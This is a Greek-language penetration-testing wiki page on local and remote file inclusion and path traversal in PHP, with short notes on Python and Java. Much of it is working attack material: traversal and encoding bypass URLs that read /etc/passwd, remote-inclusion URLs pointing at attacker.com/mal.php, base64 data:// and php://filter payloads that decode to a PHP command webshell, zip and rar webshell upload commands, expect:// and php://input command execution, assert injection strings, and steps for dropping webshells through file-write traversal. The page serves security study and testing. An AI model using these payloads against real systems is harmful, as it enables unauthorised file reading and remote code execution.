# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** Το αρχείο φορτώνεται από έναν remote server (Καλύτερο: Μπορείς να γράψεις τον κώδικα και ο server θα τον εκτελέσει). Στο php αυτό είναι **απενεργοποιημένο** από προεπιλογή (**allow_url_include**).\
**Local File Inclusion (LFI):** Ο server φορτώνει ένα τοπικό αρχείο.

Η ευπάθεια προκύπτει όταν ο χρήστης μπορεί με κάποιο τρόπο να ελέγξει το αρχείο που πρόκειται να φορτωθεί από τον server.

Ευάλωτες **PHP συναρτήσεις**: require, require_once, include, include_once

Ένα ενδιαφέρον εργαλείο για εκμετάλλευση αυτής της ευπάθειας: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Συνδυάζοντας διάφορες λίστες \*nix LFI και προσθέτοντας περισσότερα paths δημιούργησα αυτή:**

{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Δοκίμασε επίσης να αλλάξεις `/` για `\`\
Δοκίμασε επίσης να προσθέσεις `../../../../../`

A list that uses several techniques to find the file /etc/password (to check if the vulnerability exists) can be found [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Συνένωση διαφορετικών wordlists:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Δοκίμασε επίσης να αλλάξεις `/` για `\`\
Δοκίμασε επίσης να αφαιρέσεις `C:/` και να προσθέσεις `../../../../../`

A list that uses several techniques to find the file /boot.ini (to check if the vulnerability exists) can be found [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Έλεγξε τη λίστα LFI του linux.

## Βασικό LFI και παρακάμψεις

Όλα τα παραδείγματα είναι για Local File Inclusion αλλά θα μπορούσαν επίσης να εφαρμοστούν σε Remote File Inclusion (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)/>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences αφαιρούνται μη αναδρομικά
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Παράκαμψη της προσθήκης επιπλέον χαρακτήρων στο τέλος της παρεχόμενης συμβολοσειράς (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Αυτό **έχει επιλυθεί από το PHP 5.4**

### **Κωδικοποίηση**

Μπορείτε να χρησιμοποιήσετε μη-τυπικές κωδικοποιήσεις όπως double URL encode (και άλλες):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Από υπάρχον φάκελο

Ίσως το back-end ελέγχει τη διαδρομή του φακέλου:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Εξερεύνηση καταλόγων του συστήματος αρχείων σε διακομιστή

Το σύστημα αρχείων ενός διακομιστή μπορεί να εξερευνηθεί αναδρομικά για να εντοπιστούν κατάλογοι, όχι μόνο αρχεία, χρησιμοποιώντας ορισμένες τεχνικές. Αυτή η διαδικασία περιλαμβάνει τον προσδιορισμό του βάθους των καταλόγων και τον έλεγχο για την ύπαρξη συγκεκριμένων φακέλων. Παρακάτω ακολουθεί μια λεπτομερής μέθοδος για να το πραγματοποιήσετε:

1. **Προσδιορίστε το Βάθος Καταλόγου:** Καθορίστε το βάθος του τρέχοντος καταλόγου σας επιτυχώς ανακτώντας το αρχείο `/etc/passwd` (εφαρμόζεται αν ο διακομιστής βασίζεται σε Linux). Ένα παράδειγμα URL μπορεί να δομηθεί ως εξής, υποδεικνύοντας βάθος τριών:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Έλεγχος για φακέλους:** Προσθέστε το όνομα του ύποπτου φακέλου (π.χ., `private`) στο URL, και μετά πλοηγηθείτε ξανά στο `/etc/passwd`. Το επιπλέον επίπεδο καταλόγου απαιτεί την αύξηση του βάθους κατά ένα:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Ερμηνεύστε τα Αποτελέσματα:** Η απάντηση του διακομιστή υποδεικνύει αν ο φάκελος υπάρχει:
- **Σφάλμα / Χωρίς Έξοδο:** Ο φάκελος `private` πιθανότατα δεν υπάρχει στην καθορισμένη τοποθεσία.
- **Περιεχόμενα του `/etc/passwd`:** Επιβεβαιώνεται η ύπαρξη του φακέλου `private`.
4. **Αναδρομική Εξερεύνηση:** Οι εντοπισμένοι φάκελοι μπορούν να διερευνηθούν περαιτέρω για υποφακέλους ή αρχεία χρησιμοποιώντας την ίδια τεχνική ή τις παραδοσιακές μεθόδους Local File Inclusion (LFI).

Για την εξερεύνηση καταλόγων σε διαφορετικές θέσεις του συστήματος αρχείων, προσαρμόστε το payload ανάλογα. Για παράδειγμα, για να ελέγξετε αν το `/var/www/` περιέχει έναν φάκελο `private` (υποθέτοντας ότι ο τρέχων κατάλογος βρίσκεται σε βάθος 3), χρησιμοποιήστε:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation είναι μια μέθοδος που χρησιμοποιείται για να χειριστεί τις διαδρομές αρχείων σε εφαρμογές ιστού. Συχνά χρησιμοποιείται για πρόσβαση σε περιορισμένα αρχεία παρακάμπτοντας ορισμένα μέτρα ασφαλείας που προσθέτουν επιπλέον χαρακτήρες στο τέλος των διαδρομών αρχείων. Ο στόχος είναι να κατασκευαστεί μια διαδρομή αρχείου που, αφού τροποποιηθεί από το μέτρο ασφαλείας, θα εξακολουθεί να δείχνει στο επιθυμητό αρχείο.

In PHP, διάφορες αναπαραστάσεις μιας διαδρομής αρχείου μπορούν να θεωρηθούν ισοδύναμες λόγω της φύσης του συστήματος αρχείων. Για παράδειγμα:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, and `/etc/passwd/` αντιμετωπίζονται όλα ως η ίδια διαδρομή.
- Όταν οι τελευταίοι 6 χαρακτήρες είναι `passwd`, η προσθήκη ενός `/` (δημιουργώντας `passwd/`) δεν αλλάζει το αρχείο στόχο.
- Παρομοίως, αν στο τέλος μιας διαδρομής προστεθεί `.php` (π.χ. `shellcode.php`), η προσθήκη ενός `/.` στο τέλος δεν θα αλλάξει το αρχείο που προσπελαύνεται.

Τα παραδείγματα που ακολουθούν δείχνουν πώς να χρησιμοποιήσετε το path truncation για να αποκτήσετε πρόσβαση στο `/etc/passwd`, έναν κοινό στόχο λόγω του ευαίσθητου περιεχομένου του (πληροφορίες λογαριασμών χρηστών):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
Σε αυτά τα σενάρια, ο αριθμός των traversals που απαιτούνται μπορεί να είναι περίπου 2027, αλλά αυτός ο αριθμός μπορεί να διαφοροποιηθεί ανάλογα με τη διαμόρφωση του server.

- **Using Dot Segments and Additional Characters**: Traversal sequences (`../`) σε συνδυασμό με επιπλέον dot segments και χαρακτήρες μπορούν να χρησιμοποιηθούν για να πλοηγηθούν στο filesystem, αγνοώντας στην πράξη τυχόν appended strings από τον server.
- **Determining the Required Number of Traversals**: Μέσω δοκιμής και λάθους, μπορεί κανείς να βρει τον ακριβή αριθμό `../` ακολουθιών που χρειάζονται για να φτάσει στο root directory και στη συνέχεια στο `/etc/passwd`, εξασφαλίζοντας ότι τυχόν appended strings (π.χ. `.php`) εξουδετερώνονται αλλά το επιθυμητό path (`/etc/passwd`) παραμένει άθικτο.
- **Starting with a Fake Directory**: Είναι συνηθισμένη πρακτική να ξεκινάει κανείς το path με έναν ανύπαρκτο directory (π.χ. `a/`). Αυτή η τεχνική χρησιμοποιείται ως μέτρο προφύλαξης ή για να ικανοποιήσει τις απαιτήσεις της λογικής parsing του path του server.

Κατά την εφαρμογή των path truncation techniques, είναι κρίσιμο να κατανοήσετε τη συμπεριφορά parsing του path στον server και τη δομή του filesystem. Κάθε σενάριο μπορεί να απαιτεί διαφορετική προσέγγιση, και συχνά είναι απαραίτητο testing για να βρεθεί η πιο αποτελεσματική μέθοδος.

**Αυτή η vulnerability διορθώθηκε στο PHP 5.3.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

Στο php αυτό είναι απενεργοποιημένο από προεπιλογή επειδή **`allow_url_include`** είναι **Off.** Πρέπει να είναι **On** για να λειτουργήσει, και σε αυτή την περίπτωση θα μπορούσατε να συμπεριλάβετε ένα PHP αρχείο από τον server σας και να αποκτήσετε RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Εάν για κάποιο λόγο **`allow_url_include`** είναι **On**, αλλά η PHP **φιλτράρει** την πρόσβαση σε εξωτερικές ιστοσελίδες, [σύμφωνα με αυτή την ανάρτηση](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), μπορείτε για παράδειγμα να χρησιμοποιήσετε το data protocol με base64 για να αποκωδικοποιήσετε έναν b64 PHP κώδικα και να αποκτήσετε RCE:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> Στον προηγούμενο κώδικα, το τελικό `+.txt` προστέθηκε επειδή ο attacker χρειαζόταν μια συμβολοσειρά που να τελειώνει σε `.txt`, οπότε η συμβολοσειρά τελειώνει με αυτό και μετά το b64 decode εκείνο το μέρος θα επιστρέψει απλώς σκουπίδια και ο πραγματικός PHP κώδικας θα συμπεριληφθεί (και επομένως θα εκτελεστεί).

Another example **not using the `php://` protocol** would be:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python Root στοιχείο

Σε Python, σε κώδικα όπως ο παρακάτω:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Αν ο χρήστης περάσει ένα **absolute path** στο **`file_name`**, η **προηγούμενη διαδρομή απλώς αφαιρείται**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Αυτή είναι η αναμενόμενη συμπεριφορά σύμφωνα με [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Εάν ένα στοιχείο είναι απόλυτο μονοπάτι, όλα τα προηγούμενα στοιχεία απορρίπτονται και η σύνθεση συνεχίζεται από το απόλυτο στοιχείο.

## Java Λίστα καταλόγων

Φαίνεται πως αν έχεις ένα Path Traversal σε Java και **ζητήσεις έναν κατάλογο** αντί για αρχείο, **επιστρέφεται λίστα του καταλόγου**. Αυτό δεν θα συμβαίνει σε άλλες γλώσσες (afaik).

## Κορυφαίες 25 παράμετροι

Ακολουθεί λίστα με τις κορυφαίες 25 παραμέτρους που θα μπορούσαν να είναι ευάλωτες σε local file inclusion (LFI) (από το [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI χρησιμοποιώντας PHP wrappers & protocols

### php://filter

Τα PHP φίλτρα επιτρέπουν την εκτέλεση βασικών **λειτουργιών τροποποίησης στα δεδομένα** πριν αυτά διαβαστούν ή γραφτούν. Υπάρχουν 5 κατηγορίες φίλτρων:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Αφαιρεί tags από τα δεδομένα (ό,τι βρίσκεται ανάμεσα στους χαρακτήρες "<" και ">")
- Σημειώστε ότι αυτό το φίλτρο έχει εξαφανιστεί από τις σύγχρονες εκδόσεις του PHP
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Μετατρέπει σε διαφορετική κωδικοποίηση (`convert.iconv.<input_enc>.<output_enc>`). Για να πάρετε τη **λίστα όλων των κωδικοποιήσεων** που υποστηρίζονται εκτελέστε στην κονσόλα: `iconv -l`

> [!WARNING]
> Κακοποιώντας το φίλτρο μετατροπής `convert.iconv.*` μπορείτε να **παράγετε αυθαίρετο κείμενο**, κάτι που μπορεί να είναι χρήσιμο για να γράψετε αυθαίρετο κείμενο ή να κάνετε μια συνάρτηση όπως include να επεξεργαστεί αυθαίρετο κείμενο. For more info check [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Συμπιέζει το περιεχόμενο (χρήσιμο αν εξάγετε μεγάλο όγκο πληροφοριών)
- `zlib.inflate`: Αποσυμπιέζει τα δεδομένα
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Παρωχημένο
- `mdecrypt.*` : Παρωχημένο
- Other Filters
- Εκτελώντας στο php `var_dump(stream_get_filters());` μπορείτε να βρείτε μερικά **απροσδόκητα φίλτρα**:
- `consumed`
- `dechunk`: αντιστρέφει το HTTP chunked encoding
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> Το μέρος "php://filter" δεν κάνει διάκριση πεζών-κεφαλαίων

### Using php filters as oracle to read arbitrary files

[**Σε αυτή την ανάρτηση**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) προτείνεται μια τεχνική για να διαβάσετε ένα τοπικό αρχείο χωρίς να επιστραφεί το περιεχόμενο από τον server. Αυτή η τεχνική βασίζεται σε μια **boolean exfiltration of the file (char by char) using php filters** ως oracle. Αυτό συμβαίνει επειδή τα php filters μπορούν να χρησιμοποιηθούν για να κάνουν ένα κείμενο αρκετά μεγαλύτερο ώστε να κάνει την php να πετάξει εξαίρεση.

Στην αρχική ανάρτηση θα βρείτε αναλυτική εξήγηση της τεχνικής, αλλά εδώ είναι μια σύντομη περίληψη:

- Χρησιμοποιήστε το codec **`UCS-4LE`** για να αφήσετε τον αρχικό χαρακτήρα του κειμένου στην αρχή και να κάνετε το μέγεθος της συμβολοσειράς να αυξάνεται εκθετικά.
- Αυτό θα χρησιμοποιηθεί για να παραχθεί ένα **κείμενο τόσο μεγάλο όταν η αρχική λέξη έχει μαντευτεί σωστά** που η php θα ενεργοποιήσει ένα **error**
- Το φίλτρο **dechunk** θα **αφαιρέσει τα πάντα αν ο πρώτος χαρακτήρας δεν είναι hexadecimal**, οπότε μπορούμε να γνωρίζουμε αν ο πρώτος χαρακτήρας είναι hex.
- Αυτό, σε συνδυασμό με τα προηγούμενα (και άλλα filters ανάλογα με το μαντευόμενο γράμμα), θα μας επιτρέψει να μαντέψουμε ένα γράμμα στην αρχή του κειμένου βλέποντας πότε με αρκετές μετασχηματισμούς σταματάει να είναι hexadecimal χαρακτήρας. Επειδή αν είναι hex, το dechunk δεν το διαγράφει και η αρχική "βόμβα" θα προκαλέσει php error.
- Το codec **convert.iconv.UNICODE.CP930** μετασχηματίζει κάθε γράμμα στο επόμενο (οπότε μετά από αυτό το codec: a -> b). Αυτό μας επιτρέπει να ανακαλύψουμε αν ο πρώτος χαρακτήρας είναι ένα `a`, για παράδειγμα, επειδή αν εφαρμόσουμε 6 φορές αυτό το codec a->b->c->d->e->f->g το γράμμα δεν είναι πλέον hexadecimal χαρακτήρας, επομένως το dechunk δεν το διαγράφει και το php error ενεργοποιείται λόγω της αρχικής πολλαπλασιαστικής βόμβας.
- Χρησιμοποιώντας άλλους μετασχηματισμούς όπως το **rot13** στην αρχή είναι δυνατό να leak άλλους χαρακτήρες όπως n, o, p, q, r (και άλλα codecs μπορούν να χρησιμοποιηθούν για να μετακινήσουν άλλα γράμματα στο hex range).
- Όταν ο αρχικός χαρακτήρας είναι αριθμός, χρειάζεται να τον base64 encode και να leak τους 2 πρώτους χαρακτήρες για να αποκαλυφθεί ο αριθμός.
- Το τελικό πρόβλημα είναι να δούμε **πώς να leak περισσότερα από τον αρχικό χαρακτήρα**. Χρησιμοποιώντας φίλτρα που αλλάζουν τη σειρά όπως **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** είναι δυνατό να αλλάξουμε την σειρά των χαρακτήρων και να φέρουμε στην πρώτη θέση άλλα γράμματα του κειμένου.
- Και για να μπορούμε να λάβουμε **περαιτέρω δεδομένα**, η ιδέα είναι να **παράγουμε 2 bytes junk στην αρχή** με **convert.iconv.UTF16.UTF16**, να εφαρμόσουμε **UCS-4LE** ώστε να **pivot με τα επόμενα 2 bytes**, και να d**elete the data until the junk data** (αυτό θα αφαιρέσει τα πρώτα 2 bytes του αρχικού κειμένου). Συνεχίζουμε έτσι μέχρι να φτάσουμε στο επιθυμητό byte για leak.

Στην ανάρτηση δημοσιεύθηκε επίσης ένα εργαλείο για την αυτόματη εκτέλεση αυτού: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

Αυτός ο wrapper επιτρέπει την πρόσβαση σε file descriptors που η διαδικασία έχει ανοιχτά. Πιθανώς χρήσιμο για την εξαγωγή (exfiltrate) του περιεχομένου ανοιχτών αρχείων:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Μπορείτε επίσης να χρησιμοποιήσετε **php://stdin, php://stdout and php://stderr** για να αποκτήσετε πρόσβαση στα **file descriptors 0, 1 and 2** αντίστοιχα (δεν είμαι σίγουρος πώς αυτό θα μπορούσε να είναι χρήσιμο σε μια επίθεση)

### zip:// and rar://

Ανεβάστε ένα αρχείο Zip ή Rar με PHPShell μέσα και αποκτήστε πρόσβαση σε αυτό.\
Για να μπορέσετε να καταχραστείτε το rar protocol, **πρέπει να ενεργοποιηθεί συγκεκριμένα**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Σημειώστε ότι αυτό το πρωτόκολλο περιορίζεται από τις ρυθμίσεις του php **`allow_url_open`** και **`allow_url_include`**

### expect://

Το Expect πρέπει να είναι ενεργοποιημένο. Μπορείτε να εκτελέσετε κώδικα χρησιμοποιώντας αυτό:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Καθορίστε το payload στις παραμέτρους του POST:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Ένα αρχείο `.phar` μπορεί να χρησιμοποιηθεί για την εκτέλεση PHP κώδικα όταν μια web εφαρμογή χρησιμοποιεί συναρτήσεις όπως το `include` για τη φόρτωση αρχείων. Το παρακάτω απόσπασμα κώδικα PHP δείχνει τη δημιουργία ενός αρχείου `.phar`:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Για να μεταγλωττιστεί το αρχείο `.phar`, πρέπει να εκτελεστεί η ακόλουθη εντολή:
```bash
php --define phar.readonly=0 create_path.php
```
Κατά την εκτέλεση, θα δημιουργηθεί ένα αρχείο με όνομα `test.phar`, το οποίο θα μπορούσε ενδεχομένως να αξιοποιηθεί για εκμετάλλευση των Local File Inclusion (LFI) ευπαθειών.

Σε περιπτώσεις όπου το LFI περιορίζεται μόνο στην ανάγνωση αρχείων χωρίς να εκτελεί τον PHP κώδικα που περιέχουν, μέσω συναρτήσεων όπως `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, ή `filesize()`, μπορεί να επιχειρηθεί εκμετάλλευση ευπάθειας απο-σειριοποίησης. Αυτή η ευπάθεια σχετίζεται με την ανάγνωση αρχείων χρησιμοποιώντας το πρωτόκολλο `phar`.

Για λεπτομερή κατανόηση της εκμετάλλευσης ευπαθειών απο-σειριοποίησης στο πλαίσιο των `.phar` αρχείων, ανατρέξτε στο έγγραφο συνδεδεμένο παρακάτω:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

Ήταν δυνατό να καταχραστεί το **any arbitrary file read from PHP that supports php filters** για να αποκτηθεί RCE. Η λεπτομερής περιγραφή μπορεί να [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Πολύ σύντομη σύνοψη: ένα **3 byte overflow** στον PHP heap καταχράστηκε για να **alter the chain of free chunks** ενός συγκεκριμένου μεγέθους, προκειμένου να είναι δυνατό να **write anything in any address**, οπότε προστέθηκε ένα hook για να καλεί το **`system`**.\
Ήταν δυνατή η alloc chunks συγκεκριμένων μεγεθών με την κατάχρηση περισσότερων php filters.

### Περισσότερα πρωτόκολλα

Ελέγξτε περισσότερα πιθανά[ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Γράψιμο σε μνήμη ή σε προσωρινό αρχείο (δεν είμαι σίγουρος πώς μπορεί να είναι χρήσιμο σε μια file inclusion επίθεση)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Πρόσβαση στο τοπικό σύστημα αρχείων
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Πρόσβαση σε HTTP(s) URLs
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Πρόσβαση σε FTP(s) URLs
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Ροές συμπίεσης
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Εύρεση ονομάτων μονοπατιών που ταιριάζουν με πρότυπο (Δεν επιστρέφει τίποτα εκτυπώσιμο, οπότε δεν είναι πραγματικά χρήσιμο εδώ)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Ροές ήχου (Δεν είναι χρήσιμο για ανάγνωση αυθαίρετων αρχείων)

## LFI via PHP's 'assert'

Οι κίνδυνοι από Local File Inclusion (LFI) στο PHP είναι ιδιαίτερα υψηλοί όταν εμπλέκεται η συνάρτηση 'assert', η οποία μπορεί να εκτελέσει κώδικα μέσα σε strings. Αυτό είναι ιδιαίτερα προβληματικό αν γίνεται έλεγχος εισόδου που περιέχει χαρακτήρες directory traversal όπως ".." αλλά δεν γίνεται σωστή απολύμανση.

Για παράδειγμα, κώδικας PHP μπορεί να έχει σχεδιαστεί για να αποτρέπει το directory traversal ως εξής:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Παρόλο που αυτό στοχεύει στο να εμποδίσει τη traversal, άθελά του δημιουργεί ένα vector για code injection. Για να το εκμεταλλευτεί για την ανάγνωση του περιεχομένου αρχείων, ένας attacker θα μπορούσε να χρησιμοποιήσει:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Παρομοίως, για την εκτέλεση αυθαίρετων εντολών συστήματος, κάποιος μπορεί να χρησιμοποιήσει:
```plaintext
' and die(system("id")) or '
```
It's important to **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> Αυτή η τεχνική είναι σχετική σε περιπτώσεις όπου εσείς **ελέγχετε** τη **διαδρομή αρχείου** μιας **PHP function** που θα **πρόσβαση** σε ένα αρχείο αλλά δεν θα δείτε το περιεχόμενο του αρχείου (όπως μια απλή κλήση σε **`file()`**), ενώ το περιεχόμενο δεν εμφανίζεται.

Στο [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) εξηγείται πώς ένα blind path traversal μπορεί να καταχραστεί μέσω PHP filter για να **exfiltrate το περιεχόμενο ενός αρχείου μέσω ενός error oracle**.

Εν συντομία, η τεχνική χρησιμοποιεί την κωδικοποίηση **"UCS-4LE"** για να κάνει το περιεχόμενο ενός αρχείου τόσο **μεγάλο** που η **PHP function που ανοίγει** το αρχείο θα προκαλέσει ένα **error**.

Έπειτα, για να leak ο πρώτος χαρακτήρας χρησιμοποιείται το filter **`dechunk`** μαζί με άλλα όπως **base64** ή **rot13** και τελικά χρησιμοποιούνται τα φίλτρα **convert.iconv.UCS-4.UCS-4LE** και **convert.iconv.UTF16.UTF-16BE** για να **τοποθετήσουν άλλους χαρακτήρες στην αρχή και να τους leak**.

**Functions that might be vulnerable**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Για τις τεχνικές λεπτομέρειες δείτε το αναφερόμενο post!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

Όταν κώδικας server-side που δέχεται/ανεβάζει αρχεία κατασκευάζει τη διαδρομή προορισμού χρησιμοποιώντας δεδομένα που ελέγχονται από τον χρήστη (π.χ. όνομα αρχείου ή URL) χωρίς canonicalising και validating, τα segments `..` και οι απόλυτες διαδρομές μπορούν να ξεφύγουν από τον προοριζόμενο κατάλογο και να προκαλέσουν arbitrary file write. Αν μπορείτε να τοποθετήσετε το payload σε έναν web-exposed κατάλογο, συνήθως αποκτάτε unauthenticated RCE ρίχνοντας ένα webshell.

Τυπικό workflow εκμετάλλευσης:
- Εντοπίστε έναν write primitive σε ένα endpoint ή background worker που δέχεται μια διαδρομή/όνομα αρχείου και γράφει περιεχόμενο στο δίσκο (π.χ. message-driven ingestion, XML/JSON command handlers, ZIP extractors, κ.λπ.).
- Προσδιορίστε web-exposed directories. Συνηθισμένα παραδείγματα:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Κατασκευάστε μια traversal path που θα βγει από τον προβλεπόμενο storage κατάλογο προς το webroot, και συμπεριλάβετε το περιεχόμενο του webshell σας.
- Περιηγηθείτε στο dropped payload και εκτελέστε εντολές.

Σημειώσεις:
